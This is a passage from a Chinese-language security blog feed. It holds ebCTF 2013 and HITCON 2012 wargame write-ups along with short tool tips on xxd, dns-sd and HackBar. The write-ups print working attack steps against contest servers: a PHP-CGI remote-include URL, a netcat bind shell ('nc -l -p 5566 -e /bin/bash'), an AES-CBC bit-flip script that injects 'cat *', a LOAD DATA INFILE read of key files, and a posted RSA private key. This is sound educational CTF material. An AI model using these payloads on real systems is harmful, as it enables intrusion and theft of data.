</span><span class='line'>    time.sleep(1)</span></code></pre></td></tr></table></div></figure>


<p>接著要找 <code>key3</code> ，試著 <code>grep 'i hide my'</code> 之後找到一行</p>

<pre><code>is this where i hide my secrets?
</code></pre>

<p>拿他當 key 跑 AES decrypt 就拿到 flag 了！</p>

<h2>FOR200</h2>

<h3>Reference</h3>

<pre><code>&lt; Guest10733&gt; how did u get sms in for200 ?
&lt;@gijs&gt; Guest10733: the SMS is stored in inbox.txt but in some binary format that is also used to transmit sms over the network
&lt; cr0n&gt; Guest10733: sms pdu: http://www.smartposition.nl/resources/sms_pdu.html
</code></pre>

<h2>FOR300</h2>

<h3>Reference</h3>

<h2>FOR400</h2>

<h2>NET100</h2>

<p>從給的 <code>net-100.pcap</code> 裡可以找到一個有密碼的 <code>rookit.zip</code> ，發現裡面有 flag ，接著就是要找解壓縮密碼了，密碼可以在一連串的 udp packet 中找到！</p>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET200</h2>

<p>這題一開始只給了 <code>112 + 386 + 712 + 1398 + 8771 + 11982 + 15397 + 23984 = 51037</code> ，連到網頁看到了 <code>X-Powered-By:*knock knock*</code> ，猜測是要做 port knocking ！</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -w 1 54.216.81.14 112;
</span><span class='line'>$ nc -w 1 54.216.81.14 386;
</span><span class='line'>$ nc -w 1 54.216.81.14 712;
</span><span class='line'>$ nc -w 1 54.216.81.14 1398;
</span><span class='line'>$ nc -w 1 54.216.81.14 8771;
</span><span class='line'>$ nc -w 1 54.216.81.14 11982;
</span><span class='line'>$ nc -w 1 54.216.81.14 15397;
</span><span class='line'>$ nc -w 1 54.216.81.14 23984;
</span><span class='line'>$ nc -w 1 54.216.81.14 51037;
</span><span class='line'>So you are knocking me, how about I return the favor?
</span><span class='line'>Repeat after me and I will open the last port…</span></code></pre></td></tr></table></div></figure>


<p>下一階段的提示是要照著對方敲我們 port 的順序敲回去，我們是利用 <code>iptables</code> 來把進來的 tcp connection 記錄下來：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># iptables -A INPUT -p tcp -j LOG --log-prefix ' INPUT TCP ' --log-level 4</span></code></pre></td></tr></table></div></figure>


<p>接著會在 <code>/var/log/kern.log</code> 拿到記錄，接著再敲回去：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -w 1 54.216.81.14 8112;
</span><span class='line'>$ nc -w 1 54.216.81.14 33386;
</span><span class='line'>$ nc -w 1 54.216.81.14 14712;
</span><span class='line'>$ nc -w 1 54.216.81.14 4398;
</span><span class='line'>$ nc -w 1 54.216.81.14 1771;
</span><span class='line'>$ nc -w 1 54.216.81.14 52313;
</span><span class='line'>$ nc -w 1 54.216.81.14 25697;
</span><span class='line'>$ nc -w 1 54.216.81.14 932;
</span><span class='line'>$ nc -w 1 54.216.81.14 22222;
</span><span class='line'>[Advanced]
</span><span class='line'>        sequence    = 234,781,983,2411,9781,14954,23112,63991
</span><span class='line'>        seq_timeout = 15
</span><span class='line'>        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
</span><span class='line'>        tcpflags    = fin,urg,!ack
</span><span class='line'>        cmd_timeout = 30
</span><span class='line'>        stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT</span></code></pre></td></tr></table></div></figure>


<p>拿到第三階段的提示了！查了一下發現是 <a href="http://www.zeroflux.org/projects/knock/">knockd</a> 的設定檔，這次會檢查 tcp flags ，我們是用 (hping)[<a href="http://www.hping.org/">http://www.hping.org/</a>] 來設 tcp flags</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hping3 -c 1 -F -U -p 234   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 781   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 983   54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 2411  54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 9781  54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 14954 54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 23112 54.216.81.14
</span><span class='line'>hping3 -c 1 -F -U -p 63991 54.216.81.14</span></code></pre></td></tr></table></div></figure>


<p>最後再連 port 32154 就會噴 flag 了！</p>

<h3>Reference</h3>

<pre><code>&lt; ai1&gt; Ghaaf, the final one:

    nmap -vvv -PN --scanflags FINURG 54.216.81.14 -r -p234,781,983,2411,9781,14954,23112,63991 --scan-delay 1

&lt; Tilou&gt; http://pastebin.com/jBr3d9wR &lt;- hping way

    #!/bin/bash
    sequence="234 781 983 2411 9781 14954 23112 63991"
    for port in $sequence; do
        hping -F -U -c 1 -p $port 54.216.81.14 &gt; /dev/null 2&gt;&amp;1
    done
    nc 54.216.81.14 32154
</code></pre>

<ul>
<li><a href="http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up">http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up</a></li>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET300</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html">http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html</a></li>
</ul>


<h2>NET400</h2>

<h3>Reference</h3>

<h2>PWN100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; foundation: pwn100 initial key https://p.6core.net/p/yMz8naU2ZphAAHWjGkY7ICcD

-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEA8Ew1BzA3rNBwrFYevJ6mJMVfe+ZMrbrq20Q78MIprjxMmEV8
hUiYq4CftCeNj+XxYYuaYLwAA8GfW+wrS04AAEzHTNwc1wKbHdOzvParhiIFOjJ2
NX/ljlQA7LCO0bToMg971gKrFGYPGMa5vKsx9hXyDCLegXHV3G/duPxaG0hkYucC
UrilqtGMFmpFQu+vgDdudEEVg+01BtNanCxOeYuWLnd8ViZx3qrdooPNnhxh1hop
ciYNp5ORQiYKFFCmIxAMRnXYlZt5CbPIbNrRLHKSnrDyOhSLa0e3tjnGYv+YjrHB
OaWQoPu3dOu88ason5jhbTKzZ2gOe24vlg9hdwIBIwKCAQApMaKwxm/xvVUk25A9
l4oyMHbEyGTqlRJReWlceQ51o+/fluIleijM8Xp2p7HeJ2s1SyHHcK+LnYkIcaEF
mFfFiYFAYD91UOdkMuucvJJuxADlZ7x+My6qr1Cdmpwj8yB9nEEdX4sKz6rRDB/X
M0pks04QtYU6ww64Ey1S6W6IVTh/6TNzPc2mEBtHJd7yDI08aY0fbIOf5z4WNPBE
oEYIu6FWTMDf57XaUPclrPNnCturWcAdzw1DgYiyuDaS4YtryDfyaBA+WbepEOEb
HFkMf6jgDfqpnGc+vL8Z3ggoftOHZPdS3NNScrR1zRZbRyLP6DNRPjmIldThIrdv
fb+LAoGBAPzFhrlH84GwoZs+Hd/YFYgQxySGEqSspp6x14wv+7eseUN8Vp/+A11Z
kZfRHrZU5r5eTIlo+ajXeX8Uu04U5A0X3mFXpfsGksPuEvVPPzCHwHIvfsDl2u/3
ymStMDg2DHbAnyncLYUVVMjAVudL7MDq3fz1T44gfAcj+/jQOgwBAoGBAPNd5UeV
MfRcJ1G5RNDm5kTkXegMNXEH1wF+HFTb3v5Ey9A6tnc+Bhpg66QgSYtwIPdll2oF
9Jdw+8oa4tL785ZrzGSTcNQjUrBsE7H/dkPbyXH+4KXMKUEwME2cz7PrZKU4RZ9P
b+WACdIFaH3mn3H38GPIotWqLK2LfQi7d813AoGAVqofj/tpbkswF/gKPh4zRJgJ
w2Eq9qGYNmjcMBBzj25VdjlCRXupYdWRANn75r4F+CBUwWXR8L7n08yX/YOBY5Mn
rFiQrdZeNIwjwdIHCVMdaPpXWBRLEHI2w26UMIePPqhxFaqTQ5JI9F8zvQQWqIsK
SBmXnnGJnAxWY++e34sCgYB2NOu1DfOxNBMZENhINaMLhN0nkObB3zyLskhGeWxP
ncIUrs2nochzNmPTYCO4wW8ZFBZYEYVuIO9TiWbbgbDUCHk4KltfuWKtdlK1irXJ
MD1F/3RtyZBhfc5RlU7w/U4kXSkhflrr0HnMaQbeEO5b7XTCwIma+uKALc8EPcx5
vQKBgBCqEbKrfUF5H1QQunHiIsRE40zJ8MaGZbdT7ZC/bXTcwFnC+m3Ql/Iko3KU
qJ59EAryB5SmrpViNlhl3JL+Pu2m4fNhvxVfBdNSxuJMjodK6n2O4WeF0NUS0bpZ
EZRema+mBXD/lSTh1d9FnEOwrbFFEnuTZfAnEvEFo1m/Qn43
-----END RSA PRIVATE KEY-----
</code></pre>

<h2>PWN200</h2>

<pre><code>$ perl -e 'print "&gt;"x51 . "-"x47 . "\ncat IM_A_FLAG\n"' | nc 176.34.95.148 31313
</code></pre>

<h2>PWN300</h2>

<h3>Reference</h3>

<pre><code>&lt; gna_&gt; pwn300 writeup
&lt; gna_&gt; http://pastebin.com/G0KvW6t6
&lt; bata_&gt; pwn300 http://pastebin.com/gc8u6J3M
</code></pre>

<ul>
<li><a href="http://haxx.in/ebctf_pwn300_sploit.php.txt">http://haxx.in/ebctf_pwn300_sploit.php.txt</a></li>
<li><a href="http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html">http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html</a></li>
</ul>


<h2>PWN400</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html">http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet&#8212;dimwit&#8212;pwn-400.html</a></li>
</ul>


<h2>WEB100</h2>

<h3>Reference</h3>

<pre><code>&lt;@gijs&gt; loveldyream: this is what i developed when i tested it
        https://p.6core.net/p/0lAkDRAsvPqj1zeMVz6A5xcl&gt; using blind
        injection but i know the author has a one-liner which will
        return the value directly without using blind injection
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/46">http://hardc0de.ctf.su/archives/46</a></li>
</ul>


<h2>WEB200</h2>

<h3>Reference</h3>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/11">http://hardc0de.ctf.su/archives/11</a></li>
</ul>


<h2>WEB300</h2>

<h3>Reference</h3>

<pre><code>&lt; daniel1024&gt; xpath injection in web100?
&lt; daniel1024&gt; *300
&lt;@gijs&gt; daniel1024: yes xpath injection
&lt; RlIxOTA4&gt; web300 was xpat
&lt; RlIxOTA4&gt; h
</code></pre>

<h2>WEB400</h2>

<p>這題很有趣！雖然我們沒有解出來 XD</p>

<p>一開始要利用 <code>function hmac($data)</code> 裡的 typo 讓我們可以假造合法的 cookie ，
接著再利用 AES CBC mode 解密時會和前一個 block 做 xor 的特性，
只要知道某一段 plaintext 是什麼，就可以在 ciphertext 中 xor 前一個 block ，
讓解出來的 plaintext 變成我們想要的（超抽象 XD ）</p>

<p>沒有寫完整 writeup ，有興趣的人可以看下面的 reference 研究一下 PoC ！</p>

<h3>Reference</h3>

<pre><code>&lt; phiber_&gt; web400 solution http://privatepaste.com/1d0f3254f6

&lt;?php
$a = base64_decode(urldecode('%2FW8w%2BUpwN%2B2vh85b54XcyGM2wSNNFFcBqoGr%2BX5S7FOuJn%2FJBJwp1R1F5VpqsR9NkW82Ut8L5hPFKa%2BWIEs2W9DP9Qnq9zhmAJ5FwbNcY6viYT2kZd1Yz06lplcsnRuaFU8gj5TV9jHX8wps2%2BTaAO68TrHgF3Scvt56BrGAlZX%2Fp24qGKQf5m%2B15RdsgC6M%2BQ9Fl7KhwazU1F9yJ9rx7GH5HsCC4ztYeVVoiFYQQIDMPMHZkIeA7sbYrhH6L9Ej8DlEb2dErkHBVP98Wp5aAxm8jIXeqgBHfPF8s26o%2Bjs2T6XfWm3cv%2FN4yp93yGEpSja7dAr1Bdw3k1TVVPAqzGFBA2SbB6skHQhNiC5hfJ4TdymBfzzt8QLvGT3KKBlQP1sgNcLIpwhFCOGlGkN1Nq7%2Bb2GV5h%2FtyLH%2FTW2LGuVcBCTRXFY7mC0IPV2WCFSTyOddnX5t2sNeU9zBop9WeWQe199f50%2FRKRX4aA%2FLsSrGqv%2F2s4z96n9I0Zu4oGcpb9hGh3zvzGZQy6J4TAeKRKCRsIW3vDFacngSGcUAklS4nsRqXJBVEZ70WcBFQjVI7zMX8cjJS8RiyQLKgGpKirYotsetFk98xonYzbwBnyNLiNFEM0WSsPoDSW2UvQe3NfDEJKwT63l9uaAHTbfWXQ%3D%3D'));
$blocks = str_split($a, 16);
$blocks[22] = $blocks[22] ^ str_repeat('a', 16) ^ "';cat *; echo 'a";
$b = implode('', $blocks);
echo urlencode(base64_encode($b))."\n";
?&gt;
</code></pre>

<ul>
<li><a href="http://hardc0de.ctf.su/archives/43">http://hardc0de.ctf.su/archives/43</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[用 xxd 解 Hex String]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/08/yong-xxd-jie-hex-string/"/>
    <updated>2013-11-08T13:57:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/08/yong-xxd-jie-hex-string</id>
    <content type="html"><![CDATA[<p>本來解 hex string 都是用有點醜的 perl one-liner</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ perl -ne 'print map chr hex, m/../g' &lt;&lt;&lt; 646d340a
</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>


<p>不過昨天又研究了一下 <code>xxd</code> 發現一些神秘的功能，像是發現有 C style 的 output ！</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i data
</span><span class='line'>unsigned char data[] = {
</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x62, 0x69, 0x61, 0x6e,
</span><span class='line'>  0x72, 0x79, 0x3f, 0x0a
</span><span class='line'>};
</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>


<p>還可以調 column 數</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i -c 8 data
</span><span class='line'>unsigned char data[] = {
</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20,
</span><span class='line'>  0x62, 0x69, 0x61, 0x6e, 0x72, 0x79, 0x3f, 0x0a
</span><span class='line'>};
</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>


<p>然後 <a href="http://blog.atdog.org">atdog</a> 大大看到之後，又教了我怎麼用 <code>xxd</code> 解 hex string</p>

<ul>
<li>生 hex string</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p &lt;&lt;&lt; dm4
</span><span class='line'>646d340a</span></code></pre></td></tr></table></div></figure>


<ul>
<li>解 hex string</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p -r &lt;&lt;&lt; 646d340a
</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>


<p>太帥了！而且比原本 perl one-liner 短好多啊啊啊</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dns-sd &amp; AirPlay / AirTunes]]></title>
    <link href="http://blog.dm4.tw/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/"/>
    <updated>2013-11-08T11:59:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes</id>
    <content type="html"><![CDATA[<h2>Usage</h2>

<pre><code>$ dns-sd
dns-sd -E                  (Enumerate recommended registration domains)
dns-sd -F                      (Enumerate recommended browsing domains)
dns-sd -R &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; [&lt;TXT&gt;...] (Register a service)
dns-sd -B        &lt;Type&gt; &lt;Domain&gt;        (Browse for services instances)
dns-sd -L &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt;           (Look up a service instance)
dns-sd -P &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; &lt;Host&gt; &lt;IP&gt; [&lt;TXT&gt;...]  (Proxy)
dns-sd -q &lt;name&gt; &lt;rrtype&gt; &lt;rrclass&gt; (Generic query for any record type)
dns-sd -Z        &lt;Type&gt; &lt;Domain&gt;   (Output results in Zone File format)
dns-sd -G     v4/v6/v4v6 &lt;name&gt;  (Get address information for hostname)
dns-sd -V    (Get version of currently running daemon / system service)
</code></pre>

<h2>Type</h2>

<ul>
<li>AirTunes 是 <code>_raop._tcp.</code></li>
<li>AirPlay 是 <code>_airplay._tcp.</code></li>
</ul>


<h2>Browse &amp; Look up</h2>

<pre><code>$ dns-sd -B _raop._tcp
Browsing for _raop._tcp
Timestamp     A/R Flags if Domain                    Service Type              Instance Name
17:05:13.971  Add     3  8 local.                    _raop._tcp.               C92A14084F64@Hello

$ dns-sd -L "C92A14084F64@Hello" _raop._tcp.
Lookup C92A14084F64@Hello._raop._tcp..local
17:11:26.993  C92A14084F64@Hello._raop._tcp.local. can be reached at Hello.local.:50391 (interface 8) Flags: 1
 et=0,3,5 cn=1,2,3 da=true sf=0x4 tp=UDP vv=1 pw=false am=AppleTV3,1 txtvers=1 vn=65537 md=0,1,2 vs=150.33 sv=false ch=2 sr=44100 rhd=4.6.5 ss=16
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Command Line 小知識]]></title>
    <link href="http://blog.dm4.tw/blog/2013/01/27/command-line-xiao-zhi-shi/"/>
    <updated>2013-01-27T22:35:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2013/01/27/command-line-xiao-zhi-shi</id>
    <content type="html"><![CDATA[<p>前幾天看了這篇 <a href="http://geekblog.oneandoneis2.org/index.php/2012/09/30/to-understand-the-command-line">To understand the command line&hellip;</a> 覺得蠻有趣的，大概是在說：</p>

<ul>
<li><code>awk</code>: 作者名字的縮寫</li>
<li><code>cat</code>: concatenate</li>
<li><code>more</code>: 螢幕最下面會顯示 &ldquo;More&rdquo;</li>
<li><code>less</code>: more 的加強版，因為 &ldquo;less is more&rdquo; 所以叫 less</li>
<li><code>ed</code>: editor</li>
<li><code>sed</code>: stream editor</li>
<li><code>grep</code>: 在 <code>ed</code> 裡要找有包含特定字串的行並印出，本來是要用 <code>g/regular expression/p</code> ，簡寫成 <code>g/re/p</code> 就變成 <code>grep</code> 了</li>
<li>hjkl 方向鍵是因為 <a href="http://www.catonmat.net/blog/why-vim-uses-hjkl-as-arrow-keys/">ADM-3A</a></li>
<li><code>~</code> 代表 HOME 也是因為 <a href="http://www.catonmat.net/blog/why-vim-uses-hjkl-as-arrow-keys/">ADM-3A</a></li>
<li><code>.</code> 開頭的檔案是隱藏檔，本來只是要跳過 <code>.</code> 和 <code>..</code> ，結果寫出有 bug 的 <code>if (name[0] == '.') continue;</code></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes - Part 2]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2/"/>
    <updated>2012-07-26T14:21:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2</id>
    <content type="html"><![CDATA[<h3>Web 5</h3>

<p>結果回家研究了一下，終於把 Web 5 也解出來了！好後悔在 HITCON 花太多時間在看
<a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a> 啊啊啊 orz</p>

<p>這題的 <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/19527.pdf">提示二</a>
出來之後，可以發現長檔名的檔案/資料夾會因為 <code>~</code> 的縮寫而 disclosure ，所以可以寫個
<a href="https://gist.github.com/3180618">script</a> 來踹，或是用 hint 裡有提到的 <a href="http://code.google.com/p/iis-shortname-scanner-poc/">iis-shortname-scanner-poc</a></p>

<p>不過試了之後發現 file disclosure 只限於有 <code>~</code> 的長檔名，
如果只是 6, 7 個字的檔案/資料夾是不會被套用縮寫的規則，所以也就踹不出來，
在 HITCON 的時候我們就是卡在這裡。</p>

<p>回家再查了多一點資料的時候，看到更多有關 <a href="http://scilnet.fortlewis.edu/tech/NT-Server/File_Names.htm">8.3 Filename</a>
的介紹，其中提到：</p>

<blockquote><p>To disable short filename support, use the registration database editor, REGEDT32.EXE,
and search the HKEY_LOCAL_MACHINE section for the entry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem.
Change the value of the parameter NtfsDisable8dot3NameCreation to a value of 1 (one),
and then short filename generation will be disabled.</p></blockquote>

<p>所以就想到去試一下 <a href="http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt">http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt</a>
沒想到就&hellip;&hellip; orz</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Firefox HackBar Font Setting on Mac OSX]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx/"/>
    <updated>2012-07-24T20:32:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx</id>
    <content type="html"><![CDATA[<p>聽說 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 是 Firefox 下很好用的 extension ，
不過在 Mac OSX 下的字型實在是&hellip;&hellip;慘不忍賭，所以找了一下設定檔在哪裡，Firefox extension 在 Mac OSX 下的路徑是：</p>

<pre><code>~/Library/Application Support/Firefox/Profiles/xxxxxxxx.default/extensions/{F5DDF39C-9293-4d5e-9AA8-E04E6DD5E9B4}.xpi
</code></pre>

<p>其中 <code>xxxxxxxx.default</code> 可能要自己找一下，找到 <code>.xpi</code> 之後可以直接用 <code>vim</code> 來改裡面的檔（.xpi 就是一包 .zip），找到
<code>chrome/skin/hackbar.css</code> 把 textbox 的部份加上想要的字型和大小：</p>

<pre><code>textbox#hackBarTargetUrl,
textbox#hackBarTargetUrlPostField,
textbox#hackBarTargetUrlReferrerField { font-family: monaco, monospace, courier; font-size: 16px; }
</code></pre>

<p>就有舒服的 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 可以看了~</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/7636698076/" title="Flickr 上 sunrisedm4 的 hackbar-font-setting"><img src="http://farm8.staticflickr.com/7248/7636698076_ccf7da7915.jpg" width="500" height="318" alt="hackbar-font-setting"></a></p>

<p>如果想要自己改 source 話，也可以到 <a href="http://code.google.com/p/hackbar/">HackBar Firefox Extension</a> 來載 source code</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON 2012 Wargame Notes]]></title>
    <link href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/"/>
    <updated>2012-07-22T11:27:00+08:00</updated>
    <id>http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes</id>
    <content type="html"><![CDATA[<p>今年是第二年來 HITCON ，去年感謝 atdog 大大帶我一起報名 HITCON 玩 wargame ，
本來想說和去年一樣解解 QR code 我就很開心了，沒想到今年運氣不錯 XD</p>

<p>感謝同隊 crax 的組員： atdog xman jeffxx cyen hliu kvchung</p>

<p>Wargame 題目有大大幫忙備分了：<a href="http://rsghost.org/backup/wargame.hitcon.org/">HITCON 2012 Wargame</a></p>

<h2>Wargame 心得</h2>

<p>這次因為運氣好，所以有幾題 web 都用爛招解掉了 XD
用和 hint 沒關係的解法繞掉其實解的有點心虛，下面是今年我有幫到一些忙的題目：</p>

<h3>Web 1</h3>

<p>主要就是利用 <code>{${fucntion()}}</code> 來直接執行 php function ，本來想用 <code>file_get_contents()</code> 來讀 <code>key.php</code> 發現被擋掉了，
所以就試著用 <code>include()</code> 再用 <code>get_defined_vars()</code> 和 <code>var_dump()</code> 看有沒有設什麼變數，還好 <code>key.php</code> 是把 key 放在變數裡，
不然的話就要用其他方法去看 source 了。</p>

<pre><code>http://wg.hack.idv.tw/~ow100/orange.php?name=dm4&amp;data={${include($_GET[key])}}{${var_dump(get_defined_vars())}}
http://wg.hack.idv.tw/~ow100/yourfiles/dm4.config.php?key=../key.php
</code></pre>

<h3>Web 2</h3>

<p>利用 Web 3 給的 <code>sqln00b/sqln00b</code> 可以登入 phpMyAdmin ，接著把 <code>key.php</code> LOAD 到任何一個 table 就可以了：</p>

<pre><code>CREATE TABLE web2 (src TEXT);
LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
</code></pre>

<h3>Web 4</h3>

<p>從 <code>info.php</code> 發現 <code>Server API: CGI</code> 想到應該是在說今年的 <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">PHP CGI vulnerability</a>
，這東西今年出來的時候有看一下，不過其實還是在解題的時候才真的看懂 XD</p>

<p>在 <code>htaccess.txt</code> 裡可以看到</p>

<pre><code>RewriteCond %{QUERY_STRING} \-|\-d[a-z_]+%3d|%2d[a-z_]+%3d [NC]
</code></pre>

<p>發現 <code>%2d</code> 擋的比較鬆，所以研究了一下可以用</p>

<pre><code>http://wg.hack.idv.tw/~w100/info.php?%2dd+allow_url_include%3dOn+%2dd+auto_prepend_file%3dhttp://myhost/a.txt
</code></pre>

<p>來做 remote code execution ，試了一下就可以發現要找的東西在 <code>../key.txt</code> ，所以在 <code>a.txt</code> 這樣寫就可以讓它噴 key 了：</p>

<pre><code>&lt;?php
    system('cat ../key.txt');
    exit();
?&gt;
</code></pre>

<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&hellip;&hellip;</p>

<pre><code>&lt;?php
    system('nc -l -p 5566 -e /bin/bash');
    exit();
?&gt;
</code></pre>

<p>然後&hellip;&hellip;</p>

<pre><code>[~] $ nc wg.hack.idv.tw 5566
id
uid=1002(w100) gid=33(www-data) groups=1002(w100),33(www-data)
</code></pre>

<h3>Web 3</h3>

<p>這題看 hint 應該是要用 mysql client 的 <code>system</code> 來解，不過我們利用 Web 4 拿到的 back connect shell
可以發現要找的東西是 <code>/home/my100/key.txt</code> ，所以一樣用：</p>

<pre><code>CREATE TABLE web3 (src TEXT);
LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
</code></pre>

<p>就可以在 Web 2 的 phpMyAdmin 看到 key 囉~</p>

<h3>Web 6</h3>

<p>也是用爛招&hellip;&hellip; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>

<h3>Potent Pwnables 2</h3>

<p><code>nmap</code> 完之後發現有開 ftp ，查了一下發現有 <a href="http://www.exploit-db.com/exploits/18182/">Serv-U FTP Jail Break</a>
和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>

